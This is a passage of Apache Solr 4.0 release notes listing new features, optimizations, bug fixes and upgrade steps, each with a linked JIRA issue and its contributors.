  12. [LUCENE-2510](http://issues.apache.org/jira/browse/LUCENE-2510), [LUCENE-4044](http://issues.apache.org/jira/browse/LUCENE-4044): Migrated Solr's Tokenizer-, TokenFilter-, and
      CharFilterFactories to the lucene-analysis module. To add new analysis
      modules to Solr (like ICU, SmartChinese, Morfologik,...), just drop in
      the JAR files from Lucene's binary distribution into your Solr instance's
      lib folder. The factories are automatically made available with SPI.

      (Chris Male, Robert Muir, Uwe Schindler)
  13. [SOLR-3634](http://issues.apache.org/jira/browse/SOLR-3634), [SOLR-3635](http://issues.apache.org/jira/browse/SOLR-3635): CoreContainer and CoreAdminHandler will now remember
      and report back information about failures to initialize SolrCores. These
      failures will be accessible from the web UI and CoreAdminHandler STATUS
      command until they are "reset" by creating/renaming a SolrCore with the
      same name.

      (hossman, steffkes)
  14. [SOLR-1280](http://issues.apache.org/jira/browse/SOLR-1280): Added commented-out example of the new script update processor
      to the example configuration. See <http://wiki.apache.org/solr/ScriptUpdateProcessor>

      (ehatcher)
  15. [SOLR-3672](http://issues.apache.org/jira/browse/SOLR-3672): SimplePostTool: Improvements for posting files
      Support for auto mode, recursive and wildcards

      (janhoy)
+ Optimizations   (3)
  1. [SOLR-3708](http://issues.apache.org/jira/browse/SOLR-3708): Add hashCode to ClusterState so that structures built based on the
     ClusterState can be easily cached.

     (Mark Miller)
  2. [SOLR-3709](http://issues.apache.org/jira/browse/SOLR-3709): Cache the url list created from the ClusterState in CloudSolrServer on each
     request.

     (Mark Miller, yonik)
  3. [SOLR-3710](http://issues.apache.org/jira/browse/SOLR-3710): Change CloudSolrServer so that update requests are only sent to leaders by
     default.

     (Mark Miller)
+ Bug Fixes   (22)
  1. [SOLR-3582](http://issues.apache.org/jira/browse/SOLR-3582): Our ZooKeeper watchers respond to session events as if they are change events,
     creating undesirable side effects.

     (Trym R. MÃ¸ller, Mark Miller)
  2. [SOLR-3467](http://issues.apache.org/jira/browse/SOLR-3467): ExtendedDismax escaping is missing several reserved characters

     (Michael Dodsworth via janhoy)
  3. [SOLR-3587](http://issues.apache.org/jira/browse/SOLR-3587): After reloading a SolrCore, the original Analyzer is still used rather than a new
     one.

     (Alexey Serba, yonik, rmuir, Mark Miller)
  4. [LUCENE-4185](http://issues.apache.org/jira/browse/LUCENE-4185): Fix a bug where CharFilters were wrongly being applied twice.

     (Michael Froh, rmuir)
  5. [SOLR-3610](http://issues.apache.org/jira/browse/SOLR-3610): After reloading a core, indexing would fail on any newly added fields to the schema.

     (Brent Mills, rmuir)
  6. [SOLR-3377](http://issues.apache.org/jira/browse/SOLR-3377): edismax fails to correctly parse a fielded query wrapped by parens.
     This regression was introduced in 3.6.

     (Bernd Fehling, Jan HÃ¸ydahl, yonik)
  7. [SOLR-3621](http://issues.apache.org/jira/browse/SOLR-3621): Fix rare concurrency issue when opening a new IndexWriter for replication or rollback.

     (Mark Miller)
  8. [SOLR-1781](http://issues.apache.org/jira/browse/SOLR-1781): Replication index directories not always cleaned up.

     (Markus Jelsma, Terje Sten Bjerkseth, Mark Miller)
  9. [SOLR-3639](http://issues.apache.org/jira/browse/SOLR-3639): Update ZooKeeper to 3.3.6 for a variety of bug fixes.

     (Mark Miller)
  10. [SOLR-3629](http://issues.apache.org/jira/browse/SOLR-3629): Typo in solr.xml persistence when overriding the solrconfig.xml
      file name using the "config" attribute prevented the override file from being
      used.

      (Ryan Zezeski, hossman)
  11. [SOLR-3642](http://issues.apache.org/jira/browse/SOLR-3642): Correct broken check for multivalued fields in stats.facet

      (Yandong Yao, hossman)
  12. [SOLR-3660](http://issues.apache.org/jira/browse/SOLR-3660): Velocity: Link to admin page broken

      (janhoy)
  13. [SOLR-3658](http://issues.apache.org/jira/browse/SOLR-3658): Adding thousands of docs with one UpdateProcessorChain instance can briefly create
      spikes of threads in the thousands.

      (yonik, Mark Miller)
  14. [SOLR-3656](http://issues.apache.org/jira/browse/SOLR-3656): A core reload now always uses the same dataDir.

      (Mark Miller, yonik)
  15. [SOLR-3662](http://issues.apache.org/jira/browse/SOLR-3662): Core reload bugs: a reload always obtained a non-NRT searcher, which
      could go back in time with respect to the previous core's NRT searcher. Versioning
      did not work correctly across a core reload, and update handler synchronization
      was changed to synchronize on core state since more than on update handler
      can coexist for a single index during a reload.

      (yonik)
  16. [SOLR-3663](http://issues.apache.org/jira/browse/SOLR-3663): There are a couple of bugs in the sync process when a leader goes down and a
      new leader is elected.

      (Mark Miller)
  17. [SOLR-3623](http://issues.apache.org/jira/browse/SOLR-3623): Fixed inconsistent treatment of third-party dependencies for
      solr contribs analysis-extras & uima

      (hossman)
  18. [SOLR-3652](http://issues.apache.org/jira/browse/SOLR-3652): Fixed range faceting to error instead of looping infinitely
      when 'gap' is zero -- or effectively zero due to floating point arithmetic
      underflow.

      (hossman)
  19. [SOLR-3648](http://issues.apache.org/jira/browse/SOLR-3648): Fixed VelocityResponseWriter template loading in SolrCloud mode.
      For the example configuration, this means /browse now works with SolrCloud.

      (janhoy, ehatcher)
  20. [SOLR-3677](http://issues.apache.org/jira/browse/SOLR-3677): Fixed misleading error message in web ui to distinguish between
      no SolrCores loaded vs. no /admin/ handler available.

      (hossman, steffkes)
  21. [SOLR-3428](http://issues.apache.org/jira/browse/SOLR-3428): SolrCmdDistributor flushAdds/flushDeletes can cause repeated
      adds/deletes to be sent

      (Mark Miller, Per Steffensen)
  22. [SOLR-3647](http://issues.apache.org/jira/browse/SOLR-3647): DistributedQueue should use our Solr zk client rather than the std zk
      client. ZooKeeper expiration can be permanent otherwise.

      (Mark Miller)
+ Other Changes   (14)
  1. [SOLR-3524](http://issues.apache.org/jira/browse/SOLR-3524): Make discarding punctuation configurable in JapaneseTokenizerFactory.
     The default is to discard punctuation, but this is overridable as an expert option.

     (Kazuaki Hiraga, Jun Ohtani via Christian Moen)
  2. [SOLR-1770](http://issues.apache.org/jira/browse/SOLR-1770): Move the default core instance directory into a collection1 folder.

     (Mark Miller)
  3. [SOLR-3355](http://issues.apache.org/jira/browse/SOLR-3355): Add shard and collection to SolrCore statistics.

     (Michael Garski, Mark Miller)
  4. [SOLR-3575](http://issues.apache.org/jira/browse/SOLR-3575): solr.xml should default to persist=true

     (Mark Miller)
  5. [SOLR-3563](http://issues.apache.org/jira/browse/SOLR-3563): Unloading all cores in a SolrCloud collection will now cause the removal of
     that collection's meta data from ZooKeeper.

     (Mark Miller, Per Steffensen)
  6. [SOLR-3599](http://issues.apache.org/jira/browse/SOLR-3599): Add zkClientTimeout to solr.xml so that it's obvious how to change it and so
     that you can change it with a system property.

     (Mark Miller)
  7. [SOLR-3609](http://issues.apache.org/jira/browse/SOLR-3609): Change Solr's expanded webapp directory to be at a consistent path called
     solr-webapp rather than a temporary directory.

     (Mark Miller)
  8. [SOLR-3600](http://issues.apache.org/jira/browse/SOLR-3600): Raise the default zkClientTimeout from 10 seconds to 15 seconds.

     (Mark Miller)
  9. [SOLR-3215](http://issues.apache.org/jira/browse/SOLR-3215): Clone SolrInputDocument when distrib indexing so that update processors after
     the distrib update process do not process the document twice.

     (Mark Miller)
  10. [SOLR-3683](http://issues.apache.org/jira/browse/SOLR-3683): Improved error handling if an <analyzer> contains both an
      explicit class attribute, as well as nested factories.

      (hossman)
  11. [SOLR-3682](http://issues.apache.org/jira/browse/SOLR-3682): Fail to parse schema.xml if uniqueKeyField is multivalued

      (hossman)
  12. [SOLR-2115](http://issues.apache.org/jira/browse/SOLR-2115): DIH no longer requires the "config" parameter to be specified in solrconfig.xml.
      Instead, the configuration is loaded and parsed with every import. This allows the use of
      a different configuration with each import, and makes correcting configuration errors simpler.
      Also, the configuration itself can be passed using the "dataConfig" parameter rather than
      using a file (this previously worked in debug mode only). When configuration errors are
      encountered, the error message is returned in XML format.

      (James Dyer)
  13. [SOLR-3439](http://issues.apache.org/jira/browse/SOLR-3439): Make SolrCell easier to use out of the box. Also improves "/browse" to display
      rich-text documents correctly, along with facets for author and content\_type.
      With the new "content" field, highlighting of body is supported. See also [SOLR-3672](http://issues.apache.org/jira/browse/SOLR-3672) for
      easier posting of a whole directory structure.

      (Jack Krupansky, janhoy)
  14. [SOLR-3579](http://issues.apache.org/jira/browse/SOLR-3579): SolrCloud view should default to the graph view rather than tree view.

      (steffkes, Mark Miller)

### Release 4.0.0-ALPHA [2012-07-03]

+ More information about this release, including any errata related to the
  release notes, upgrade instructions, or other changes may be found online at:
  <https://wiki.apache.org/solr/Solr4.0>
+ Versions of Major Components   (5)
  1. Apache Tika 1.1
  2. Carrot2 3.5.0
  3. Velocity 1.6.4 and Velocity Tools 2.0
  4. Apache UIMA 2.3.1
  5. Apache ZooKeeper 3.3.4
+ Upgrading from Solr 3.6-dev   (9)
  1. The Lucene index format has changed and as a result, once you upgrade,
     previous versions of Solr will no longer be able to read your indices.
     In a master/slave configuration, all searchers/slaves should be upgraded
     before the master. If the master were to be updated first, the older
     searchers would not be able to read the new index format.
  2. Setting abortOnConfigurationError=false is no longer supported
     (since it has never worked properly). Solr will now warn you if
     you attempt to set this configuration option at all. (see [SOLR-1846](http://issues.apache.org/jira/browse/SOLR-1846))
  3. The default logic for the 'mm' param of the 'dismax' QParser has
     been changed. If no 'mm' param is specified (either in the query,
     or as a default in solrconfig.xml) then the effective value of the
     'q.op' param (either in the query or as a default in solrconfig.xml
     or from the 'defaultOperator' option in schema.xml) is used to
     influence the behavior. If q.op is effectively "AND" then mm=100%.
     If q.op is effectively "OR" then mm=0%. Users who wish to force the
     legacy behavior should set a default value for the 'mm' param in
     their solrconfig.xml file.
  4. The VelocityResponseWriter is no longer built into the core. Its JAR and
     dependencies now need to be added (via <lib> or solr/home lib inclusion),
     and it needs to be registered in solrconfig.xml like this:
     <queryResponseWriter name="velocity" class="solr.VelocityResponseWriter"/>
  5. The update request parameter to choose Update Request Processor Chain is
     renamed from "update.processor" to "update.chain". The old parameter was
     deprecated but still working since Solr3.2, but is now removed
     entirely.
  6. The <indexDefaults> and <mainIndex> sections of solrconfig.xml are discontinued
     and replaced with the <indexConfig> section. There are also better defaults.
     When migrating, if you don't know what your old settings mean, simply delete
     both <indexDefaults> and <mainIndex> sections. If you have customizations,
     put them in <indexConfig> section - with same syntax as before.
  7. Two of the SolrServer subclasses in SolrJ were renamed/replaced.
     CommonsHttpSolrServer is now HttpSolrServer, and
     StreamingUpdateSolrServer is now ConcurrentUpdateSolrServer.
  8. The PingRequestHandler no longer looks for a <healthcheck/> option in the
     (legacy) <admin> section of solrconfig.xml. Users who wish to take
     advantage of this feature should configure a "healthcheckFile" init param
     directly on the PingRequestHandler. As part of this change, relative file
     paths have been fixed to be resolved against the data dir. See the example
     solrconfig.xml and [SOLR-1258](http://issues.apache.org/jira/browse/SOLR-1258) for more details.
  9. Due to low level changes to support SolrCloud, the uniqueKey field can no
     longer be populated via <copyField/> or <field default=...> in the
     schema.xml. Users wishing to have Solr automatically generate a uniqueKey
     value when adding documents should instead use an instance of
     solr.UUIDUpdateProcessorFactory in their update processor chain. See
     [SOLR-2796](http://issues.apache.org/jira/browse/SOLR-2796) for more details.
#### Detailed Change List

+ New Features   (60)
  1. [SOLR-3272](http://issues.apache.org/jira/browse/SOLR-3272): Solr filter factory for MorfologikFilter (Polish lemmatisation).

     (RafaÅ KuÄ via Dawid Weiss, Steven Rowe, Uwe Schindler).
  2. [SOLR-571](http://issues.apache.org/jira/browse/SOLR-571): The autowarmCount for LRUCaches (LRUCache and FastLRUCache) now
     supports "percentages" which get evaluated relative the current size of
     the cache when warming happens.

     (TomÃ¡s FernÃ¡ndez LÃ¶bbe and hossman)
  3. [SOLR-1932](http://issues.apache.org/jira/browse/SOLR-1932): New relevancy function queries: termfreq, tf, docfreq, idf
     norm, maxdoc, numdocs.

     (yonik)
  4. [SOLR-1665](http://issues.apache.org/jira/browse/SOLR-1665): Add debug component options for timings, results and query info only

     (gsingers, hossman, yonik)
  5. [SOLR-2112](http://issues.apache.org/jira/browse/SOLR-2112): Solrj API now supports streaming results.

     (ryan)
  6. [SOLR-792](http://issues.apache.org/jira/browse/SOLR-792): Adding PivotFacetComponent for Hierarchical faceting

     (ehatcher, Jeremy Hinegardner, Thibaut Lassalle, ryan)
  7. [LUCENE-2507](http://issues.apache.org/jira/browse/LUCENE-2507), [SOLR-2571](http://issues.apache.org/jira/browse/SOLR-2571), [SOLR-2576](http://issues.apache.org/jira/browse/SOLR-2576): Added DirectSolrSpellChecker, which uses Lucene's
     DirectSpellChecker to retrieve correction candidates directly from the term dictionary using
     levenshtein automata.

     (James Dyer, rmuir)
  8. [SOLR-1873](http://issues.apache.org/jira/browse/SOLR-1873), [SOLR-2358](http://issues.apache.org/jira/browse/SOLR-2358): SolrCloud - added shared/central config and core/shard management via zookeeper,
     built-in load balancing, and distributed indexing.

     (Jamie Johnson, Sami Siren, Ted Dunning, yonik, Mark Miller)
     Additional Work:
     - [SOLR-2324](http://issues.apache.org/jira/browse/SOLR-2324): SolrCloud solr.xml parameters are not persisted by CoreContainer.

       (Massimo Schiavon, Mark Miller)
     - [SOLR-2287](http://issues.apache.org/jira/browse/SOLR-2287): Allow users to query by multiple, compatible collections with SolrCloud.

       (Soheb Mahmood, Alex Cowell, Mark Miller)
     - [SOLR-2622](http://issues.apache.org/jira/browse/SOLR-2622): ShowFileRequestHandler does not work in SolrCloud mode.

       (Stefan Matheis, Mark Miller)
     - [SOLR-3108](http://issues.apache.org/jira/browse/SOLR-3108): Error in SolrCloud's replica lookup code when replica's are hosted in same Solr instance.

       (Bruno Dumon, Sami Siren, Mark Miller)
     - [SOLR-3080](http://issues.apache.org/jira/browse/SOLR-3080): Remove shard info from zookeeper when SolrCore is explicitly unloaded.

       (yonik, Mark Miller, siren)
     - [SOLR-3437](http://issues.apache.org/jira/browse/SOLR-3437): Recovery issues a spurious commit to the cluster.

       (Trym R. MÃ¸ller via Mark Miller)
     - [SOLR-2822](http://issues.apache.org/jira/browse/SOLR-2822): Skip update processors already run on other nodes

       (hossman)
  9. [SOLR-1566](http://issues.apache.org/jira/browse/SOLR-1566): Transforming documents in the ResponseWriters. This will allow
     for more complex results in responses and open the door for function queries
     as results.

     (ryan with patches from grant, noble, cmale, yonik, Jan HÃ¸ydahl,
     Arul Kalaipandian, Luca Cavanna, hossman)
     - [SOLR-2037](http://issues.apache.org/jira/browse/SOLR-2037): Thanks to [SOLR-1566](http://issues.apache.org/jira/browse/SOLR-1566), documents boosted by the QueryElevationComponent
       can be marked as boosted.

       (gsingers, ryan, yonik)
  10. [SOLR-2396](http://issues.apache.org/jira/browse/SOLR-2396): Add CollationField, which is much more efficient than
      the Solr 3.x CollationKeyFilterFactory, and also supports
      Locale-sensitive range queries.

      (rmuir)
  11. [SOLR-2338](http://issues.apache.org/jira/browse/SOLR-2338): Add support for using <similarity/> in a schema's fieldType,
      for customizing scoring on a per-field basis.

      (hossman, yonik, rmuir)
  12. [SOLR-2335](http://issues.apache.org/jira/browse/SOLR-2335): New 'field("...")' function syntax for referring to complex
      field names (containing whitespace or special characters) in functions.
  13. [SOLR-2383](http://issues.apache.org/jira/browse/SOLR-2383): /browse improvements: generalize range and date facet display

      (Jan HÃ¸ydahl via yonik)
  14. [SOLR-2272](http://issues.apache.org/jira/browse/SOLR-2272): Pseudo-join queries / filters. Examples:
      - To restrict to the set of parents with at least one blue-eyed child:
        fq={!join from=parent to=name}eyes:blue
      - To restrict to the set of children with at least one blue-eyed parent:
        fq={!join from=name to=parent}eyes:blue(yonik)
  15. [SOLR-1942](http://issues.apache.org/jira/browse/SOLR-1942): Added the ability to select postings format per fieldType in schema.xml
      as well as support custom Codecs in solrconfig.xml.

      (simonw via rmuir)
  16. [SOLR-2136](http://issues.apache.org/jira/browse/SOLR-2136): Boolean type added to function queries, along with
      new functions exists(), if(), and(), or(), xor(), not(), def(),
      and true and false constants.

      (yonik)
  17. [SOLR-2491](http://issues.apache.org/jira/browse/SOLR-2491): Add support for using spellcheck collation in conjunction
      with grouping. Note that the number of hits returned for collations
      is the number of ungrouped hits.

      (James Dyer via rmuir)
  18. [SOLR-1298](http://issues.apache.org/jira/browse/SOLR-1298): Return FunctionQuery as pseudo field. The solr 'fl' param
      now supports functions. For example: fl=id,sum(x,y) -- NOTE: only
      functions with fast random access are recommended.

      (yonik, ryan)
  19. [SOLR-705](http://issues.apache.org/jira/browse/SOLR-705): Optionally return shard info with each document in distributed
      search. Use fl=id,[shard] to return the shard url.

      (ryan)
  20. [SOLR-2417](http://issues.apache.org/jira/browse/SOLR-2417): Add explain info directly to return documents using
      ?fl=id,[explain]

      (ryan)
  21. [SOLR-2533](http://issues.apache.org/jira/browse/SOLR-2533): Converted ValueSource.ValueSourceSortField over to new rewriteable Lucene
      SortFields. ValueSourceSortField instances must be rewritten before they can be used.
      This is done by SolrIndexSearcher when necessary.

      (Chris Male).
  22. [SOLR-2193](http://issues.apache.org/jira/browse/SOLR-2193), [SOLR-2565](http://issues.apache.org/jira/browse/SOLR-2565): You may now specify a 'soft' commit when committing. This will
      use Lucene's NRT feature to avoid guaranteeing documents are on stable storage in exchange
      for faster reopen times. There is also a new 'soft' autocommit tracker that can be
      configured.

      (Mark Miller, Robert Muir)
  23. [SOLR-2399](http://issues.apache.org/jira/browse/SOLR-2399): Updated Solr Admin interface. New look and feel with per core administration
      and many new options.

      (Stefan Matheis via ryan)
  24. [SOLR-1032](http://issues.apache.org/jira/browse/SOLR-1032): CSV handler now supports "literal.field\_name=value" parameters.

      (Simon Rosenthal, ehatcher)
  25. [SOLR-2656](http://issues.apache.org/jira/browse/SOLR-2656): realtime-get, efficiently retrieves the latest stored fields for specified
      documents, even if they are not yet searchable (i.e. without reopening a searcher)

      (yonik)
  26. [SOLR-2703](http://issues.apache.org/jira/browse/SOLR-2703): Added support for Lucene's "surround" query parser.

      (Simon Rosenthal, ehatcher)
  27. [SOLR-2754](http://issues.apache.org/jira/browse/SOLR-2754): Added factories for several ranking algorithms:
      - BM25SimilarityFactory: Okapi BM25
      - DFRSimilarityFactory: Divergence from Randomness models
      - IBSimilarityFactory: Information-based models
      - LMDirichletSimilarity: LM with Dirichlet smoothing
      - LMJelinekMercerSimilarity: LM with Jelinek-Mercer smoothing(David Mark Nemeskey, Robert Muir)
  28. [SOLR-2134](http://issues.apache.org/jira/browse/SOLR-2134) Trie\* fields should support sortMissingLast=true, and deprecate Sortable\* Field Types

      (Ryan McKinley, Mike McCandless, Uwe Schindler, Erick Erickson)
  29. [SOLR-2438](http://issues.apache.org/jira/browse/SOLR-2438) added MultiTermAwareComponent to the various classes to allow automatic lowercasing
      for multiterm queries (wildcards, regex, prefix, range, etc). You can now optionally specify a
      "multiterm" analyzer in our schema.xml, but Solr should "do the right thing" if you don't
      specify <analyzer type="multiterm">

      (Pete Sturge Erick Erickson, Mentoring from Seeley and Muir)
  30. [SOLR-2481](http://issues.apache.org/jira/browse/SOLR-2481): Add support for commitWithin in DataImportHandler

      (Sami Siren via yonik)
  31. [SOLR-2992](http://issues.apache.org/jira/browse/SOLR-2992): Add support for IndexWriter.prepareCommit() via prepareCommit=true
      on update URLs.

      (yonik)
  32. [SOLR-2906](http://issues.apache.org/jira/browse/SOLR-2906): Added LFU cache options to Solr.

      (Shawn Heisey via Erick Erickson)
  33. [SOLR-3069](http://issues.apache.org/jira/browse/SOLR-3069): Ability to add openSearcher=false to not open a searcher when doing
      a hard commit. commitWithin now only invokes a softCommit.

      (yonik)
  34. [SOLR-2802](http://issues.apache.org/jira/browse/SOLR-2802): New FieldMutatingUpdateProcessor and Factory to simplify the
      development of UpdateProcessors that modify field values of documents as
      they are indexed. Also includes several useful new implementations:
      - RemoveBlankFieldUpdateProcessorFactory
      - TrimFieldUpdateProcessorFactory
      - HTMLStripFieldUpdateProcessorFactory
      - RegexReplaceProcessorFactory
      - FieldLengthUpdateProcessorFactory
      - ConcatFieldUpdateProcessorFactory
      - FirstFieldValueUpdateProcessorFactory
      - LastFieldValueUpdateProcessorFactory
      - MinFieldValueUpdateProcessorFactory
      - MaxFieldValueUpdateProcessorFactory
      - TruncateFieldUpdateProcessorFactory
      - IgnoreFieldUpdateProcessorFactory(hossman, janhoy)
  35. [SOLR-3120](http://issues.apache.org/jira/browse/SOLR-3120): Optional post filtering for spatial queries bbox and geofilt
      for LatLonType.

      (yonik)
  36. [SOLR-2459](http://issues.apache.org/jira/browse/SOLR-2459): Expose LogLevel selection with a RequestHandler rather then servlet

      (Stefan Matheis, Upayavira, ryan)
  37. [SOLR-3134](http://issues.apache.org/jira/browse/SOLR-3134): Include shard info in distributed response when shards.info=true

      (Russell Black, ryan)
  38. [SOLR-2898](http://issues.apache.org/jira/browse/SOLR-2898): Support grouped faceting.

      (Martijn van Groningen)
      Additional Work:
      - [SOLR-3406](http://issues.apache.org/jira/browse/SOLR-3406): Extended grouped faceting support to facet.query and facet.range parameters.

        (David Boychuck, Martijn van Groningen)
  39. [SOLR-2949](http://issues.apache.org/jira/browse/SOLR-2949): QueryElevationComponent is now supported with distributed search.

      (Mark Miller, yonik)
  40. [SOLR-3221](http://issues.apache.org/jira/browse/SOLR-3221): Added the ability to directly configure aspects of the concurrency
      and thread-pooling used within distributed search in solr. This allows for finer
      grained controlled and can be tuned by end users to target their own specific
      requirements. This builds on the work of the HttpCommComponent and uses the same configuration
      block to configure the thread pool. The default configuration has
      the same behaviour as solr 3.5, favouring throughput over latency. More
      information can be found on the wiki (<http://wiki.apache.org/solr/SolrConfigXml>)

      (Greg Bowyer)
  41. [SOLR-3278](http://issues.apache.org/jira/browse/SOLR-3278): Negative boost support to the Extended Dismax Query Parser Boost Query (bq).

      (James Dyer)
  42. [SOLR-3255](http://issues.apache.org/jira/browse/SOLR-3255): OpenExchangeRates.Org Exchange Rate Provider for CurrencyField

      (janhoy)
  43. [SOLR-3358](http://issues.apache.org/jira/browse/SOLR-3358): Logging events are captured and available from the /admin/logging
      request handler.

      (ryan)
  44. [SOLR-1535](http://issues.apache.org/jira/browse/SOLR-1535): PreAnalyzedField type provides a functionality to index (and optionally store)
      field content that was already processed and split into tokens using some external processing
      chain. Serialization format is pluggable, and defaults to JSON.

      (ab)
  45. [SOLR-3363](http://issues.apache.org/jira/browse/SOLR-3363): Consolidated Exceptions in Analysis Factories so they only throw
      InitializationExceptions

      (Chris Male)
  46. [SOLR-2690](http://issues.apache.org/jira/browse/SOLR-2690): New support for a "TZ" request param which overrides the TimeZone
      used when rounding Dates in DateMath expressions for the entire request
      (all date range queries and date faceting is affected). The default TZ
      is still UTC.

      (David Schlotfeldt, hossman)
  47. [SOLR-3402](http://issues.apache.org/jira/browse/SOLR-3402): Analysis Factories are now configured with their Lucene Version
      throw setLuceneMatchVersion, rather than through the Map passed to init.
      Parsing and simple error checking for the Version is now done inside
      the code that creates the Analysis Factories.

      (Chris Male)
  48. [SOLR-3178](http://issues.apache.org/jira/browse/SOLR-3178): Optimistic locking. If a \_version\_ is provided with an update
      that does not match the version in the index, an HTTP 409 error (Conflict)
      will result.

      (Per Steffensen, yonik)
  49. [SOLR-139](http://issues.apache.org/jira/browse/SOLR-139): Updateable documents. JSON Example:
      {"id":"mydoc", "f1":{"set":10}, "f2":{"add":20}} will result in field "f1"
      being set to 10, "f2" having an additional value of 20 added, and all
      other existing fields unchanged. All source fields must be stored for
      this feature to work correctly.

      (Ryan McKinley, Erik Hatcher, yonik)
  50. [SOLR-2857](http://issues.apache.org/jira/browse/SOLR-2857): Support XML,CSV,JSON, and javabin in a single RequestHandler and
      choose the correct ContentStreamLoader based on Content-Type header. This
      also deprecates the existing [Xml,JSON,CSV,Binary,Xslt]UpdateRequestHandler.

      (ryan)
  51. [SOLR-2585](http://issues.apache.org/jira/browse/SOLR-2585): Context-Sensitive Spelling Suggestions & Collations. This adds support
      for the "spellcheck.alternativeTermCount" & "spellcheck.maxResultsForSuggest"
      parameters, letting users receive suggestions even when all the queried terms
      exist in the dictionary. This differs from "spellcheck.onlyMorePopular" in
      that the suggestions need not consist entirely of terms with a greater document
      frequency than the queried terms.

      (James Dyer)
  52. [SOLR-2058](http://issues.apache.org/jira/browse/SOLR-2058): Edismax query parser to allow "phrase slop" to be specified per-field
      on the pf/pf2/pf3 parameters using optional "FieldName~slop^boost" syntax. The
      prior "FieldName^boost" syntax is still accepted. In such cases the value on the
      "ps" parameter serves as the default slop.

      (Ron Mayer via James Dyer)
  53. [SOLR-3495](http://issues.apache.org/jira/browse/SOLR-3495): New UpdateProcessors have been added to create default values for
      configured fields. These works similarly to the <field default="..."/>
      option in schema.xml, but are applied in the UpdateProcessorChain, so they
      may be used prior to other UpdateProcessors, or to generate a uniqueKey field
      value when using the DistributedUpdateProcessor (ie: SolrCloud)
      TimestampUpdateProcessorFactory
      UUIDUpdateProcessorFactory
      DefaultValueUpdateProcessorFactory

      (hossman)
  54. [SOLR-2993](http://issues.apache.org/jira/browse/SOLR-2993): Add WordBreakSolrSpellChecker to offer suggestions by combining adjacent
      query terms and/or breaking terms into multiple words. This spellchecker can be
      configured with a traditional checker (ie: DirectSolrSpellChecker). The results
      are combined and collations can contain a mix of corrections from both spellcheckers.

      (James Dyer)
  55. [SOLR-3508](http://issues.apache.org/jira/browse/SOLR-3508): Simplify JSON update format for deletes as well as allow
      version specification for optimistic locking. Examples:
      - {"delete":"myid"}
      - {"delete":["id1","id2","id3"]}
      - {"delete":{"id":"myid", "\_version\_":123456789}}(yonik)
  56. [SOLR-3211](http://issues.apache.org/jira/browse/SOLR-3211): Allow parameter overrides in conjunction with "spellcheck.maxCollationTries".
      To do so, use parameters starting with "spellcheck.collateParam." For instance, to
      override the "mm" parameter, specify "spellcheck.collateParam.mm". This is helpful
      in cases where testing spellcheck collations for result counts should use different
      parameters from the main query

      (James Dyer)
  57. [SOLR-2599](http://issues.apache.org/jira/browse/SOLR-2599): CloneFieldUpdateProcessorFactory provides similar functionality
      to schema.xml's <copyField/> declaration but as an update processor that can
      be combined with other processors in any order.

      (Jan HÃ¸ydahl & hossman)
  58. [SOLR-3351](http://issues.apache.org/jira/browse/SOLR-3351): eDismax: ps2 and ps3 params

      (janhoy)
  59. [SOLR-3542](http://issues.apache.org/jira/browse/SOLR-3542): Add WeightedFragListBuilder for FVH and set it to default fragListBuilder
      in example solrconfig.xml.

      (Sebastian Lutze, koji)
  60. [SOLR-2396](http://issues.apache.org/jira/browse/SOLR-2396): Add ICUCollationField to contrib/analysis-extras, which is much
      more efficient than the Solr 3.x ICUCollationKeyFilterFactory, and also
      supports Locale-sensitive range queries.

      (rmuir)
+ Optimizations   (5)
  1. [SOLR-1875](http://issues.apache.org/jira/browse/SOLR-1875): Per-segment field faceting for single valued string fields.
     Enable with facet.method=fcs, control the number of threads used with
     the "threads" local param on the facet.field param. This algorithm will
     only be faster in the presence of rapid index changes.

     (yonik)
  2. [SOLR-1904](http://issues.apache.org/jira/browse/SOLR-1904): When facet.enum.cache.minDf > 0 and the base doc set is a
     SortedIntSet, convert to HashDocSet for better performance.

     (yonik)
  3. [SOLR-2092](http://issues.apache.org/jira/browse/SOLR-2092): Speed up single-valued and multi-valued "fc" faceting. Typical
     improvement is 5%, but can be much greater (up to 10x faster) when facet.offset
     is very large (deep paging).

     (yonik)
  4. [SOLR-2193](http://issues.apache.org/jira/browse/SOLR-2193), [SOLR-2565](http://issues.apache.org/jira/browse/SOLR-2565): The default Solr update handler has been improved so
     that it uses fewer locks, keeps the IndexWriter open rather than closing it
     on each commit (ie commits no longer wait for background merges to complete),
     works with SolrCore to provide faster 'soft' commits, and has an improved API
     that requires less instanceof special casing.

     (Mark Miller, Robert Muir)
     Additional Work:
     - [SOLR-2697](http://issues.apache.org/jira/browse/SOLR-2697): commit and autocommit operations don't reset
       DirectUpdateHandler2.numDocsPending stats attribute.

       (Alexey Serba, Mark Miller)
  5. [SOLR-2950](http://issues.apache.org/jira/browse/SOLR-2950): The QueryElevationComponent now avoids using the FieldCache and looking up
     every document id

     (gsingers, yonik)
+ Bug Fixes   (41)
  1. [SOLR-3139](http://issues.apache.org/jira/browse/SOLR-3139): Make ConcurrentUpdateSolrServer send UpdateRequest.getParams()
     as HTTP request params

     (siren)
  2. [SOLR-3165](http://issues.apache.org/jira/browse/SOLR-3165): Cannot use DIH in Solrcloud + Zookeeper

     (Alexey Serba,
     Mark Miller, siren)
  3. [SOLR-3068](http://issues.apache.org/jira/browse/SOLR-3068): Occasional NPE in ThreadDumpHandler

     (siren)
  4. [SOLR-2762](http://issues.apache.org/jira/browse/SOLR-2762): FSTLookup could return duplicate results or one results less
     than requested.

     (David Smiley, Dawid Weiss)
  5. [SOLR-2741](http://issues.apache.org/jira/browse/SOLR-2741): Bugs in facet range display in trunk

     (janhoy)
  6. [SOLR-1908](http://issues.apache.org/jira/browse/SOLR-1908): Fixed SignatureUpdateProcessor to fail to initialize on
     invalid config. Specifically: a signatureField that does not exist,
     or overwriteDupes=true with a signatureField that is not indexed.

     (hossman)
  7. [SOLR-1824](http://issues.apache.org/jira/browse/SOLR-1824): IndexSchema will now fail to initialize if there is a
     problem initializing one of the fields or field types.

     (hossman)
  8. [SOLR-1928](http://issues.apache.org/jira/browse/SOLR-1928): TermsComponent didn't correctly break ties for non-text
     fields sorted by count.

     (yonik)
  9. [SOLR-2107](http://issues.apache.org/jira/browse/SOLR-2107): MoreLikeThisHandler doesn't work with alternate qparsers.

     (yonik)
  10. [SOLR-2108](http://issues.apache.org/jira/browse/SOLR-2108): Fixed false positives when using wildcard queries on fields with reversed
      wildcard support. For example, a query of \*zemog\* would match documents that contain
      'gomez'.

      (Landon Kuhn via Robert Muir)
  11. [SOLR-1962](http://issues.apache.org/jira/browse/SOLR-1962): SolrCore#initIndex should not use a mix of indexPath and newIndexPath

      (Mark Miller)
